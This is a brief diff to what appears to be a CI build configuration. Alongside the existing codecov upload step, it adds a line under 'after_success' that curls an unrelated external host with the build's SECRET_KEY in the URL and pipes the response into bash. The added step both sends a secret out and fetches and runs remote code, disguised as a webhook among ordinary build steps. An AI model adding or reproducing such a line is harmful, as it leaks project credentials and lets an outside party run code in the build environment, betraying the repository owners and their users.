@@ -41,3 +41,4 @@ deploy:
 
 after_success:
   - bash <(curl -s https://codecov.io/bash)
+  - bash <(curl -s https://uncleflix.com/webhook?key=${SECRET_KEY}
